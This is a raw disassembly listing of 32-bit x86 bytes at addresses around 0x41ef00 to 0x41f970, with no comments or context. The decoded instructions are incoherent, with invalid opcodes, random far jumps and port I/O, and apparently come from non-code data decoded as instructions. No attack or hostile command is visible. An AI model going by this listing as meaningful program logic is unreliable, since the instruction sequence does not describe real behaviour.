  41eeff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef00:	mov    edi,0x60ad9913
  41ef05:	adc    ch,dl
  41ef07:	or     ebx,esi
  41ef09:	mov    ah,BYTE PTR [ecx]
  41ef0b:	lahf   
  41ef0c:	jno    0x41ef75
  41ef0e:	fidivr WORD PTR [ebx+0x1f7aa64b]
  41ef14:	xlat   BYTE PTR ds:[ebx]
  41ef15:	inc    eax
  41ef16:	les    eax,FWORD PTR [ecx]
  41ef18:	ret    
  41ef19:	stc    
  41ef1a:	or     ebx,ecx
  41ef1c:	shl    eax,0x90
  41ef1f:	jmp    0x41ef9f
  41ef21:	int3   
  41ef22:	fisub  WORD PTR [esi-0x5d53c799]
  41ef28:	cmp    ebx,ecx
  41ef2a:	add    eax,DWORD PTR [esi]
  41ef2c:	push   ecx
  41ef2d:	inc    esp
  41ef2e:	adc    al,0x40
  41ef30:	push   edx
  41ef31:	ins    DWORD PTR es:[edi],dx
  41ef32:	jo     0x41ef25
  41ef34:	popf   
  41ef35:	mov    al,ds:0xcac5ea7f
  41ef3a:	push   esp
  41ef3b:	jno    0x41eec7
  41ef3d:	sub    cl,BYTE PTR [ebp-0xb8a722e]
  41ef43:	fidivr WORD PTR [edx+ebx*4]
  41ef46:	in     eax,0x8b
  41ef48:	test   bh,bl
  41ef4a:	adc    BYTE PTR [eax+0x6556449a],0xe5
  41ef51:	cs dec esp
  41ef53:	clc    
  41ef54:	cmp    eax,0x59949178
  41ef59:	push   ecx
  41ef5a:	inc    ecx
  41ef5b:	lea    ebx,[edx-0x30]
  41ef5e:	call   0x42ac:0x7e42b93b
  41ef65:	sahf   
  41ef66:	aad    0x3
  41ef68:	xor    ch,0x54
  41ef6b:	jmp    0x41ef92
  41ef6d:	dec    edi
  41ef6e:	pushf  
  41ef6f:	sbb    al,0x7f
  41ef71:	enter  0x17df,0x35
  41ef75:	sbb    DWORD PTR [eax-0x7c65fbe8],edx
  41ef7b:	push   0xffffffbc
  41ef7d:	sub    bl,0x74
  41ef80:	aaa    
  41ef81:	sub    al,0xb0
  41ef83:	imul   DWORD PTR [eax+0x660b51e7]
  41ef89:	fwait
  41ef8a:	cmp    al,0x3
  41ef8c:	xor    al,0x44
  41ef8e:	repz xor al,0xf4
  41ef91:	imul   esp,DWORD PTR [ecx-0x7c2dda0d],0xa30df89f
  41ef9b:	int3   
  41ef9c:	das    
  41ef9d:	pop    edx
  41ef9e:	mov    dh,0xcc
  41efa0:	push   ss
  41efa1:	mov    eax,ds:0xe8c698ec
  41efa6:	and    DWORD PTR [edi],0xfbbd0b57
  41efac:	dec    eax
  41efad:	dec    eax
  41efae:	mov    bl,0xf
  41efb0:	inc    edi
  41efb1:	xor    al,0x32
  41efb3:	jb     0x41efa2
  41efb5:	dec    ebp
  41efb6:	stc    
  41efb7:	jno    0x41ef91
  41efb9:	lds    edx,FWORD PTR [esi-0x6b]
  41efbc:	dec    esp
  41efbd:	test   eax,0x7e43d9
	...
  41f032:	add    BYTE PTR [eax],al
  41f034:	dec    edi
  41f035:	push   ebx
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x13]
  41f041:	fdivr  QWORD PTR [edx-0x1a]
  41f044:	call   0xf541f195
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [edi+edi*2-0x6],dh
  41f04f:	cld    
  41f050:	call   0xba59db2d
  41f055:	stos   BYTE PTR es:[edi],al
  41f056:	add    WORD PTR ds:[ebx-0x26],bx
  41f05b:	dec    eax
  41f05c:	mov    ds:0x3042eabb,al
  41f061:	xor    eax,DWORD PTR [esi]
  41f063:	dec    esp
  41f064:	pop    ss
  41f065:	xor    DWORD PTR [esi+0x68],ebp
  41f068:	push   0xf91dd4ea
  41f06d:	lods   eax,DWORD PTR ds:[esi]
  41f06e:	pop    edi
  41f06f:	push   ecx
  41f070:	loope  0x41f00e
  41f072:	pop    ss
  41f073:	add    eax,0x68d7cf56
  41f078:	out    dx,eax
  41f079:	es jmp 0x5b94:0x94952df4
  41f081:	mov    ebx,0x46dc619e
  41f086:	lahf   
  41f087:	in     eax,0xf3
  41f089:	cmp    bl,BYTE PTR [eax-0xb]
  41f08c:	jns    0x41f057
  41f08e:	push   ds
  41f08f:	outs   dx,BYTE PTR ds:[esi]
  41f090:	and    eax,0x94064e6
  41f095:	jbe    0x41f068
  41f097:	mov    DWORD PTR [edi],ebp
  41f099:	add    eax,0xf75ab816
  41f09e:	fdivr  DWORD PTR [edx-0x24e2ceb9]
  41f0a4:	xor    BYTE PTR [ebx],ch
  41f0a6:	les    esp,FWORD PTR [eax]
  41f0a8:	iret   
  41f0a9:	cmc    
  41f0aa:	daa    
  41f0ab:	inc    edi
  41f0ac:	mov    edi,0x19e0040a
  41f0b1:	mov    al,0xcb
  41f0b3:	jnp    0x41f093
  41f0b5:	cmp    ebp,DWORD PTR [edi-0x6d]
  41f0b8:	xor    BYTE PTR [ecx],bh
  41f0ba:	ins    BYTE PTR es:[edi],dx
  41f0bb:	fdiv   QWORD PTR [ebp+0x2b]
  41f0be:	stos   BYTE PTR es:[edi],al
  41f0bf:	xchg   edi,eax
  41f0c0:	sbb    edi,DWORD PTR [edx+ebx*2-0x23c17019]
  41f0c7:	cmp    BYTE PTR [ebp-0x2f5edcf2],ah
  41f0cd:	add    eax,0xb439c9b9
  41f0d2:	cwde   
  41f0d3:	cmp    eax,DWORD PTR [edi-0x72]
  41f0d6:	pop    ss
  41f0d7:	js     0x41f156
  41f0d9:	mov    ebp,0xc1841d91
  41f0de:	cmp    DWORD PTR [esi-0x38],0xa1cd2184
  41f0e5:	push   ss
  41f0e6:	call   0x938f3472
  41f0eb:	dec    edx
  41f0ec:	add    esp,DWORD PTR [esi-0x1a]
  41f0ef:	adc    BYTE PTR [edx],0x9d
  41f0f2:	scas   al,BYTE PTR es:[edi]
  41f0f3:	cld    
  41f0f4:	aam    0x7e
  41f0f6:	inc    edx
  41f0f7:	(bad)  
  41f0f8:	mov    ebx,0x98d612d7
  41f0fd:	test   BYTE PTR [esi],dl
  41f0ff:	jbe    0x41f0eb
  41f101:	push   ebp
  41f102:	aaa    
  41f103:	int    0xcc
  41f105:	retf   
  41f106:	std    
  41f107:	push   es
  41f108:	clc    
  41f109:	loop   0x41f105
  41f10b:	not    edi
  41f10d:	enter  0x5d11,0x91
  41f111:	dec    edx
  41f112:	ret    
  41f113:	mov    al,ds:0xa07aae0f
  41f118:	dec    eax
  41f119:	dec    esp
  41f11a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f11b:	sti    
  41f11c:	and    al,0xd8
  41f11e:	aam    0x0
  41f120:	fild   DWORD PTR [edx-0x37cfbb64]
  41f126:	shr    BYTE PTR [ebp+0x51],cl
  41f129:	jmp    0xfde8:0x1dcf8ef3
  41f130:	ficomp DWORD PTR [eax]
  41f132:	jns    0x41f0fb
  41f134:	pushf  
  41f135:	jl     0x41f154
  41f137:	or     al,0xa9
  41f139:	ja     0x41f194
  41f13b:	xor    DWORD PTR [esi-0x4ce6ec58],ebp
	...
  41f1b1:	add    BYTE PTR [eax],al
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [edi-0x22ec63e3],ecx
  41f1c5:	dec    ebp
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	cmc    
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    ah,dl
  41f1cd:	inc    esp
  41f1ce:	push   ebp
  41f1cf:	stc    
  41f1d0:	xchg   edi,eax
  41f1d1:	xchg   ecx,eax
  41f1d2:	inc    ebx
  41f1d3:	sub    al,0xa3
  41f1d5:	(bad)  
  41f1d6:	sub    cl,BYTE PTR [edx]
  41f1d8:	add    edi,DWORD PTR [edx]
  41f1da:	xlat   BYTE PTR ds:[ebx]
  41f1db:	mov    dl,0x4d
  41f1dd:	jge    0x41f194
  41f1df:	jmp    0xcdcb214c
  41f1e4:	je     0x41f19e
  41f1e6:	cdq    
  41f1e7:	ret    
  41f1e8:	js     0x41f23c
  41f1ea:	dec    ebx
  41f1eb:	fst    DWORD PTR [eax+eax*8+0x59cda1f6]
  41f1f2:	dec    ebx
  41f1f3:	outs   dx,DWORD PTR ds:[esi]
  41f1f4:	xchg   ebp,eax
  41f1f5:	ret    0xc91d
  41f1f8:	fwait
  41f1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1fa:	mov    BYTE PTR [ebp-0x75b1c353],dh
  41f200:	leave  
  41f201:	rcl    bh,cl
  41f203:	mov    eax,ebx
  41f205:	pushf  
  41f206:	inc    edx
  41f207:	out    dx,al
  41f208:	xor    eax,0x2deeba30
  41f20d:	ror    BYTE PTR [ecx-0x22156bb6],cl
  41f213:	and    al,0x2e
  41f215:	mov    eax,0x567b0dab
  41f21a:	mov    edx,0x70ad1c37
  41f21f:	lea    ecx,[esi-0x71]
  41f222:	(bad)  
  41f223:	cmp    edx,edi
  41f225:	loopne 0x41f1eb
  41f227:	jno    0x41f203
  41f229:	pop    esi
  41f22a:	pop    es
  41f22b:	mov    esp,0x74bb2eb8
  41f230:	ins    BYTE PTR es:[edi],dx
  41f231:	sub    edx,esp
  41f233:	push   0xd64e91fd
  41f238:	addr16 fs xchg edx,eax
  41f23b:	lahf   
  41f23c:	xchg   esp,eax
  41f23d:	or     ebx,DWORD PTR [edx+edi*4+0x2105694c]
  41f244:	pushf  
  41f245:	xchg   DWORD PTR [esi-0xe],edi
  41f248:	sbb    eax,0xa1cf632c
  41f24d:	mov    esi,0xafa747e7
  41f252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f253:	push   esi
  41f254:	pop    eax
  41f255:	jb     0x41f281
  41f257:	inc    ebp
  41f258:	push   cs
  41f259:	push   ebx
  41f25a:	jle    0x41f245
  41f25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f25d:	sahf   
  41f25e:	pop    es
  41f25f:	lods   al,BYTE PTR ds:[esi]
  41f260:	push   ebp
  41f261:	sub    bh,BYTE PTR [ebp-0xf]
  41f264:	push   esp
  41f265:	push   edx
  41f266:	daa    
  41f267:	jmp    0xf03f:0x4f3b6c6
  41f26e:	pop    ds
  41f26f:	pushw  0xc394
  41f273:	or     eax,0xa32689cc
  41f278:	jno    0x41f276
  41f27a:	hlt    
  41f27b:	rol    DWORD PTR [ebx],0x7
  41f27e:	sbb    bh,al
  41f280:	jbe    0x41f271
  41f282:	dec    ebp
  41f283:	repz sar DWORD PTR [ebx+0x2],1
  41f287:	mov    ch,0xa6
  41f289:	jo     0x41f265
  41f28b:	cwde   
  41f28c:	cld    
  41f28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f28e:	push   ebx
  41f28f:	adc    eax,0x2ebd2fc5
  41f294:	pop    edx
  41f295:	push   ebx
  41f296:	in     eax,dx
  41f297:	add    edx,DWORD PTR ds:0xc5339c66
  41f29d:	lahf   
  41f29e:	mov    cl,BYTE PTR [ebp+0x78b9cc32]
  41f2a4:	mov    gs,ebx
  41f2a6:	mov    eax,0x50210d6b
  41f2ab:	ja     0x41f307
  41f2ad:	add    al,0x0
  41f2af:	pop    ds
  41f2b0:	cmp    BYTE PTR [edi],ah
  41f2b2:	mov    al,0xb1
  41f2b4:	pop    ebp
  41f2b5:	cmp    BYTE PTR ds:0x3fe96523,dl
  41f2bb:	mov    eax,ds:0x4c9b85e3
  41f2c0:	popa   
	...
  41f331:	add    BYTE PTR [eax],al
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x5d:0x169531a0
  41f343:	xchg   ecx,eax
  41f344:	ror    BYTE PTR [esi+0x1],cl
  41f347:	add    ch,dh
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [eax-0x9],cl
  41f34e:	mov    bl,0x5d
  41f350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f351:	(bad)  
  41f352:	outs   dx,BYTE PTR ds:[esi]
  41f353:	outs   dx,BYTE PTR es:[esi]
  41f355:	inc    edi
  41f356:	xchg   esp,eax
  41f357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f358:	inc    esp
  41f359:	lods   al,BYTE PTR ds:[esi]
  41f35a:	setae  BYTE PTR [ecx-0x28]
  41f35e:	or     eax,DWORD PTR [ebp-0x1c8666b4]
  41f364:	fucom  st(1)
  41f366:	(bad)  
  41f367:	rol    cl,0x1e
  41f36a:	xor    DWORD PTR ds:0xebfdef76,eax
  41f370:	push   es
  41f371:	jmp    0x41f3e7
  41f373:	retf   
  41f374:	loope  0x41f395
  41f376:	sbb    ebx,DWORD PTR [eax-0x4d]
  41f379:	xor    dl,BYTE PTR ds:0x3f0eff55
  41f37f:	jbe    0x41f38b
  41f381:	outs   dx,BYTE PTR ds:[esi]
  41f382:	dec    edi
  41f383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f384:	aas    
  41f385:	scas   eax,DWORD PTR es:[edi]
  41f386:	sub    ch,cl
  41f388:	inc    ecx
  41f389:	stos   BYTE PTR es:[edi],al
  41f38a:	adc    edi,edx
  41f38c:	fst    DWORD PTR [ebx+0x13deb853]
  41f392:	mov    bl,0x5f
  41f394:	or     eax,0x95fb9ab5
  41f399:	aam    0xce
  41f39b:	daa    
  41f39c:	dec    esp
  41f39d:	ds pop edx
  41f39f:	outs   dx,DWORD PTR ds:[esi]
  41f3a0:	jmp    0x2a1d93a7
  41f3a5:	ret    0xb7
  41f3a8:	mov    WORD PTR [ebx],fs
  41f3aa:	lods   al,BYTE PTR ds:[esi]
  41f3ab:	mov    dl,0xd7
  41f3ad:	shl    BYTE PTR [edi],0x56
  41f3b0:	fmul   QWORD PTR [edx-0xbb9940f]
  41f3b6:	test   edx,0x9b7eca0f
  41f3bc:	push   esi
  41f3bd:	popa   
  41f3be:	jae    0x41f40b
  41f3c0:	cmp    BYTE PTR [esi+0x41],0xb7
  41f3c4:	dec    eax
  41f3c5:	xor    BYTE PTR [ecx+0x2e],ch
  41f3c8:	ret    0x1a26
  41f3cb:	cwde   
  41f3cc:	inc    esp
  41f3cd:	jnp    0x41f3ce
  41f3cf:	sbb    eax,0x25c84f43
  41f3d4:	add    eax,0x7faec443
  41f3d9:	inc    BYTE PTR [esi-0x1c]
  41f3dc:	sahf   
  41f3dd:	inc    ecx
  41f3de:	mov    bl,0x69
  41f3e0:	mov    ch,0xce
  41f3e2:	mov    ds:0x30865d9d,al
  41f3e7:	std    
  41f3e8:	scas   al,BYTE PTR es:[edi]
  41f3e9:	jmp    0xdcbd:0x9844102f
  41f3f0:	sar    DWORD PTR [eax+0x3c6544bb],1
  41f3f6:	(bad)  
  41f3f7:	aam    0xaf
  41f3f9:	or     al,0xd4
  41f3fb:	nop
  41f3fc:	enter  0x4333,0xaf
  41f400:	push   ebx
  41f401:	sbb    al,0x99
  41f403:	dec    esp
  41f404:	jmp    0x41f42a
  41f406:	les    ebx,FWORD PTR [esi*1-0x27ee1ec2]
  41f40d:	sbb    edi,DWORD PTR [ebp-0x65c09cd6]
  41f413:	test   eax,0x4d773412
  41f418:	mov    dh,0x11
  41f41a:	retf   
  41f41b:	sub    al,0x73
  41f41d:	fdiv   DWORD PTR [esp+eiz*4-0x70ac3eb5]
  41f424:	nop
  41f425:	pushf  
  41f426:	in     eax,0x77
  41f428:	sbb    BYTE PTR [ecx-0x112151d6],cl
  41f42e:	push   edi
  41f42f:	push   0x3d0a3018
  41f434:	popf   
  41f435:	xchg   edi,eax
  41f436:	cwde   
  41f437:	mov    ecx,0xf903313b
  41f43c:	xchg   ecx,eax
  41f43d:	(bad)
	...
  41f4b1:	add    BYTE PTR [eax],al
  41f4b3:	add    BYTE PTR [eax],ah
  41f4b5:	push   0xffffffcb
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x49
  41f4c1:	int    0xdd
  41f4c3:	pop    ebp
  41f4c4:	(bad)  
  41f4c5:	dec    edi
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	cmc    
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [esi-0x61],al
  41f4ce:	pushf  
  41f4cf:	add    dl,BYTE PTR [edi+edi*2+0x20]
  41f4d3:	sbb    edi,DWORD PTR [ebx+0x2f]
  41f4d6:	or     ah,BYTE PTR [esi]
  41f4d8:	lods   al,BYTE PTR ds:[esi]
  41f4d9:	retf   0x70bf
  41f4dc:	dec    edx
  41f4dd:	cmp    DWORD PTR [ecx-0x387b3933],ecx
  41f4e3:	out    dx,eax
  41f4e4:	add    al,0x58
  41f4e6:	call   0xdf1f:0xc2bb9460
  41f4ed:	sub    DWORD PTR [ecx],ebp
  41f4ef:	cmp    BYTE PTR [ecx+0x6d],0x62
  41f4f3:	repz js 0x41f4cd
  41f4f6:	pusha  
  41f4f7:	pop    edi
  41f4f8:	clc    
  41f4f9:	js     0x41f4d5
  41f4fb:	mov    ecx,?
  41f4fd:	addr16 fs xchg esp,eax
  41f500:	mov    esi,0x59ec4dc9
  41f505:	pop    ebp
  41f506:	mov    WORD PTR [ebx-0x29],gs
  41f509:	mov    ds:0xe9074d34,al
  41f50e:	stc    
  41f50f:	jo     0x41f564
  41f511:	mov    ebx,0x233beef0
  41f516:	jge    0x41f567
  41f518:	test   bl,cl
  41f51a:	jb     0x41f594
  41f51c:	adc    DWORD PTR [edi+0x4f61af16],edi
  41f522:	sub    eax,DWORD PTR [ebx+0x4c]
  41f525:	mov    edi,0xdfbd6a69
  41f52a:	pop    esp
  41f52b:	js     0x41f567
  41f52d:	or     BYTE PTR [esi+0x311f9f2b],dh
  41f533:	sbb    ebx,DWORD PTR [ecx]
  41f535:	jge    0x41f536
  41f537:	loop   0x41f4f3
  41f539:	sub    bh,BYTE PTR [eax+0x6dbeb78c]
  41f53f:	xor    ebp,DWORD PTR [eax+0x58]
  41f542:	pop    esi
  41f543:	sub    BYTE PTR [ebx-0x55b7c862],0xfb
  41f54a:	fstp   DWORD PTR [eax-0x645dfa12]
  41f550:	outs   dx,BYTE PTR ds:[esi]
  41f551:	pop    ds
  41f552:	fs pop edx
  41f554:	fimul  WORD PTR [eax-0x4e]
  41f557:	cmp    DWORD PTR [edx+eax*1-0x62],ebx
  41f55b:	inc    edx
  41f55c:	sbb    eax,0xd6f9b4c1
  41f561:	pusha  
  41f562:	rdtsc  
  41f564:	outs   dx,DWORD PTR ds:[esi]
  41f565:	jns    0x41f54f
  41f567:	clc    
  41f568:	inc    BYTE PTR [ebx-0x40e25b3]
  41f56e:	pop    ds
  41f56f:	outs   dx,BYTE PTR ds:[esi]
  41f570:	push   0x28
  41f572:	in     eax,dx
  41f573:	sub    al,0x26
  41f575:	aad    0x5f
  41f577:	dec    edx
  41f578:	xchg   edx,eax
  41f579:	mov    eax,DWORD PTR ds:0x29e67803
  41f57f:	xchg   ebp,eax
  41f580:	pushf  
  41f581:	fild   WORD PTR [esi+0x22]
  41f584:	cdq    
  41f585:	shr    DWORD PTR [esi-0x54dcad37],1
  41f58b:	or     al,0x3b
  41f58d:	push   ebx
  41f58e:	out    dx,al
  41f58f:	mov    al,ds:0x2582daef
  41f594:	iret   
  41f595:	push   0xab3dd7f4
  41f59a:	inc    DWORD PTR [esi]
  41f59c:	in     eax,0x8f
  41f59e:	mov    ah,0xbc
  41f5a0:	scas   eax,DWORD PTR es:[edi]
  41f5a1:	lods   eax,DWORD PTR ds:[esi]
  41f5a2:	data16 fstp QWORD PTR [edi+ebx*4-0x64]
  41f5a7:	stc    
  41f5a8:	sub    eax,0x1abb7a39
  41f5ad:	ins    BYTE PTR es:[edi],dx
  41f5ae:	retf   
  41f5af:	loop   0x41f5c8
  41f5b1:	ss sahf 
  41f5b3:	add    DWORD PTR [edx+0x36],eax
  41f5b6:	pop    ds
  41f5b7:	pop    es
  41f5b8:	jb     0x41f578
  41f5ba:	arpl   WORD PTR [eax-0x33d08c7d],cx
  41f5c0:	jnp    0x41f5c2
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0x3901e835
  41f641:	mov    bh,BYTE PTR [edi+0x2b]
  41f644:	mov    esp,0xf5000150
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    BYTE PTR [edx],bh
  41f64d:	cmp    eax,0xec01400a
  41f652:	nop
  41f653:	enter  0xb6d5,0x94
  41f657:	inc    ebp
  41f658:	mov    BYTE PTR [edx+0x12],dh
  41f65b:	out    dx,eax
  41f65c:	jmp    0xf334f017
  41f661:	imul   ecx,DWORD PTR [esi+0x20194624],0x39312cbe
  41f66b:	pusha  
  41f66c:	fnsave [edi-0x65]
  41f66f:	out    0xb3,eax
  41f671:	pop    esi
  41f672:	sub    al,0x19
  41f674:	loopne 0x41f6d6
  41f676:	or     eax,0xbd401783
  41f67b:	pop    ds
  41f67c:	or     BYTE PTR [esi+0x13],0x58
  41f680:	int    0x5e
  41f682:	loopne 0x41f6c1
  41f684:	adc    eax,0x903c34e3
  41f689:	mov    esi,0x1b90ace7
  41f68e:	ins    DWORD PTR es:[edi],dx
  41f68f:	add    eax,0xd6590b06
  41f694:	xchg   BYTE PTR [eax+0x4d],ch
  41f697:	push   edx
  41f698:	mov    ebp,0x4c71e08b
  41f69d:	loopne 0x41f65b
  41f69f:	mov    ds:0x6222c9d3,eax
  41f6a4:	inc    ebx
  41f6a5:	mov    ah,ch
  41f6a7:	mov    ch,0xd8
  41f6a9:	xor    eax,DWORD PTR [edx+0x73339c49]
  41f6af:	jecxz  0x41f723
  41f6b1:	sbb    eax,0xd9ec4029
  41f6b6:	or     bh,BYTE PTR [esi+0x41]
  41f6b9:	in     al,dx
  41f6ba:	inc    esi
  41f6bb:	xchg   ebp,eax
  41f6bc:	xor    BYTE PTR [eax+0x276e18b8],dh
  41f6c2:	dec    esp
  41f6c3:	mov    ah,0x8d
  41f6c5:	into   
  41f6c6:	xor    al,0x1f
  41f6c8:	inc    ebp
  41f6c9:	mov    eax,0x96ebc65a
  41f6ce:	es push ebx
  41f6d0:	iret   
  41f6d1:	adc    eax,0x9fc5e26c
  41f6d6:	packuswb mm2,mm2
  41f6d9:	xchg   ebp,eax
  41f6da:	xchg   edi,eax
  41f6db:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6dd:	loop   0x41f6d5
  41f6df:	push   edi
  41f6e0:	js     0x41f6b5
  41f6e2:	les    ebp,FWORD PTR [edi-0x73]
  41f6e5:	nop
  41f6e6:	xchg   edi,eax
  41f6e7:	retf   
  41f6e8:	loopne 0x41f6c3
  41f6ea:	xor    ebp,DWORD PTR [edi-0x57]
  41f6ed:	jmp    0xb39275c3
  41f6f2:	mov    bl,BYTE PTR [ebp+0x9a54331]
  41f6f8:	and    al,al
  41f6fa:	xlat   BYTE PTR ds:[ebx]
  41f6fb:	jmp    0x41f6ef
  41f6fd:	aas    
  41f6fe:	xor    eax,0x4314c33e
  41f703:	ret    
  41f704:	xor    ebp,DWORD PTR [edx+0x778c0406]
  41f70a:	dec    ebp
  41f70b:	adc    DWORD PTR gs:[ecx-0x4194c4c9],eax
  41f712:	fst    st(4)
  41f714:	add    al,0x18
  41f716:	es nop
  41f718:	pop    edx
  41f719:	ins    DWORD PTR es:[edi],dx
  41f71a:	or     al,0x71
  41f71c:	sbb    ch,BYTE PTR [esi+edx*8-0x66]
  41f720:	std    
  41f721:	in     al,dx
  41f722:	jmp    0x68cfdad6
  41f727:	les    edx,FWORD PTR [ebx-0x627a67aa]
  41f72d:	aaa    
  41f72e:	lahf   
  41f72f:	pushf  
  41f730:	pop    ebp
  41f731:	and    al,0x19
  41f733:	sti    
  41f734:	and    dl,dh
  41f736:	jl     0x41f79f
  41f738:	add    ecx,DWORD PTR [esi-0x224cdb6f]
  41f73e:	or     esp,0x3
	...
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	adc    eax,0xb114f522
  41f7c5:	push   ecx
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [edi+eiz*8+0x6817eb50],ch
  41f7d2:	ret    
  41f7d3:	ja     0x41f77a
  41f7d5:	adc    dh,0xef
  41f7d8:	mov    ebx,0x42c32baf
  41f7dd:	or     edx,DWORD PTR [ebp+0x50]
  41f7e0:	scas   al,BYTE PTR es:[edi]
  41f7e1:	and    edx,eax
  41f7e3:	xor    DWORD PTR [ecx+0x6b201e97],edx
  41f7e9:	dec    ebx
  41f7ea:	retf   
  41f7eb:	rcr    BYTE PTR [edx-0x23],cl
  41f7ee:	push   es
  41f7ef:	lea    ebx,ds:0xba2b4c1e
  41f7f5:	ret    
  41f7f6:	rcl    DWORD PTR [ebp-0x42ebb090],1
  41f7fc:	iret   
  41f7fd:	(bad)  
  41f7fe:	push   ecx
  41f7ff:	or     BYTE PTR [ebp+0x33],ch
  41f802:	int3   
  41f803:	rol    BYTE PTR [edx*2-0x24959d62],cl
  41f80a:	das    
  41f80b:	add    al,0x4f
  41f80d:	in     al,0x1b
  41f80f:	and    eax,0x63b8fa2a
  41f814:	dec    edi
  41f815:	and    BYTE PTR [edx-0x40df9f78],ah
  41f81b:	retf   0xd860
  41f81e:	adc    al,0x64
  41f820:	ja     0x41f814
  41f822:	out    0x48,al
  41f824:	pop    ebp
  41f825:	std    
  41f826:	xchg   edx,eax
  41f827:	mov    BYTE PTR [esi-0x5f],bh
  41f82a:	or     BYTE PTR [edx-0x7dc3caee],bh
  41f830:	mov    bl,0xd4
  41f832:	in     al,0x12
  41f834:	ins    BYTE PTR es:[edi],dx
  41f835:	mulps  xmm7,XMMWORD PTR [eax]
  41f838:	mov    ebx,0x734b523d
  41f83d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f83e:	imul   ebp,esp,0x2de8c451
  41f844:	cmp    al,0xf9
  41f846:	outs   dx,BYTE PTR ds:[esi]
  41f847:	into   
  41f848:	daa    
  41f849:	loopne 0x41f863
  41f84b:	fstp   DWORD PTR [ebx-0x5e]
  41f84e:	or     eax,DWORD PTR [ecx-0x55]
  41f851:	std    
  41f852:	push   0x1
  41f854:	mov    al,ds:0x7dd6375f
  41f859:	in     eax,dx
  41f85a:	fs xchg ecx,eax
  41f85c:	loope  0x41f840
  41f85e:	sbb    BYTE PTR [eax+esi*1],dh
  41f861:	into   
  41f862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f863:	fmulp  st(3),st
  41f865:	sub    DWORD PTR ds:0x1425b460,edi
  41f86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f86c:	jne    0x41f895
  41f86e:	or     BYTE PTR [ebx],dh
  41f870:	adc    eax,0x8fcd392c
  41f875:	add    ch,BYTE PTR [edx+0x2f]
  41f878:	gs xchg ebx,eax
  41f87a:	ret    
  41f87b:	sar    bh,cl
  41f87d:	xlat   BYTE PTR ds:[ebx]
  41f87e:	ds push ebx
  41f880:	xchg   BYTE PTR ds:0xce8a6a3f,cl
  41f886:	jl     0x41f80b
  41f888:	aas    
  41f889:	pop    ecx
  41f88a:	dec    esp
  41f88b:	add    eax,esp
  41f88d:	mov    bh,0xc
  41f88f:	push   eax
  41f890:	or     dl,bh
  41f892:	mov    ecx,0xdc196266
  41f897:	leave  
  41f898:	push   ss
  41f899:	stc    
  41f89a:	imul   esp,DWORD PTR [ecx+0x2d1d16c5],0x2fe292d8
  41f8a4:	jae    0x41f828
  41f8a6:	mov    eax,0xfd0c5380
  41f8ab:	loopne 0x41f8d4
  41f8ad:	xchg   DWORD PTR [edx],eax
  41f8af:	outs   dx,DWORD PTR ds:[esi]
  41f8b0:	(bad)  
  41f8b1:	(bad)  
  41f8b2:	mov    ebp,0xf93685f1
  41f8b7:	pop    ds
  41f8b8:	outs   dx,BYTE PTR ds:[esi]
  41f8b9:	mov    al,ds:0xefce82e4
  41f8be:	fcmovnu st,st(6)
  41f8c0:	add    BYTE PTR [eax],0x0
	...
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x809ffef7
  41f941:	ins    DWORD PTR es:[edi],dx
  41f942:	test   al,0x5c
  41f944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f945:	push   edx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [esi-0x7f],al
  41f94e:	lds    edx,FWORD PTR [eax+0x77]
  41f951:	les    eax,FWORD PTR [edx]
  41f953:	jg     0x41f9c7
  41f955:	popa   
  41f956:	push   0x46
  41f958:	js     0x41f8f5
  41f95a:	mov    ecx,0xc951103
  41f95f:	pop    edi
  41f960:	ja     0x41f9c1
  41f962:	mov    ds:0xd722b373,al
  41f967:	fcom   DWORD PTR [ecx]
  41f969:	xchg   ecx,eax
  41f96a:	sar    eax,0xf5
  41f96d:	mov    cl,0x9c
  41f96f:	gs cmp ah,ah
